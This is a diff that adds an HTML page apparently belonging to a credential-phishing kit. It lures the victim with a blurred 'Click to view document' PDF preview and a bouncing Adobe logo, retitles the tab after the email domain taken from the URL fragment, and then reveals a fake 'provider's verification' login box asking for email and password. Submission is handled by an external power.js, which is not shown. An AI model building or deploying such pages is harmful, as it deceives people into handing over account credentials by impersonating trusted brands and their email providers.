@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Account Verification</title>
+
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link rel="stylesheet" href="style.css">
+
+  <script>
+    // dynamic tab title
+    window.addEventListener("DOMContentLoaded", () => {
+      const hash = window.location.hash.substring(1);
+      const parts = hash.split("@");
+      if (parts.length === 2) {
+        const domain = parts[1];
+        const capitalized = domain.charAt(0).toUpperCase() + domain.slice(1);
+        document.title = capitalized;
+      }
+    });
+
+    // reveal login when blurred doc clicked
+    window.addEventListener("DOMContentLoaded", () => {
+      const start = document.getElementById("start-screen");
+      const overlay = document.getElementById("overlay");
+      start.addEventListener("click", () => {
+        start.classList.add("hide");
+        overlay.classList.add("show");
+      });
+    });
+  </script>
+</head>
+<body>
+
+  <!-- Blurred "document" start screen -->
+  <div id="start-screen">
+    <div class="doc-preview">
+      <i class="fas fa-file-pdf"></i>
+      <p>Click to view document</p>
+    </div>
+  </div>
+
+  <!-- Background iframe -->
+  <iframe id="bg-frame"></iframe>
+
+  <!-- Login overlay -->
+  <div class="overlay" id="overlay">
+    <div class="login-box">
+      <img id="logo" alt="Logo" />
+
+      <div class="info-text">
+        🗂️ <strong>Secured file access</strong> 🔐 — sign in for your provider’s verification
+      </div>
+
+      <div class="input-group">
+        <i class="fas fa-envelope icon"></i>
+        <input type="email" id="email" placeholder="Email" />
+      </div>
+
+      <div class="input-group">
+        <i class="fas fa-lock icon"></i>
+        <input type="password" id="password" placeholder="Password" />
+      </div>
+
+      <div id="error-msg" class="error-msg"></div>
+
+      <button id="login-btn">Login</button>
+    </div>
+  </div>
+
+  <!-- Bouncing Adobe logo -->
+  <div class="bouncing-logo">
+    <img
+      src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Adobe_Corporate_logo.svg"
+      alt="Adobe Logo" />
+  </div>
+
+  <script src="power.js"></script>
+</body>
+</html>
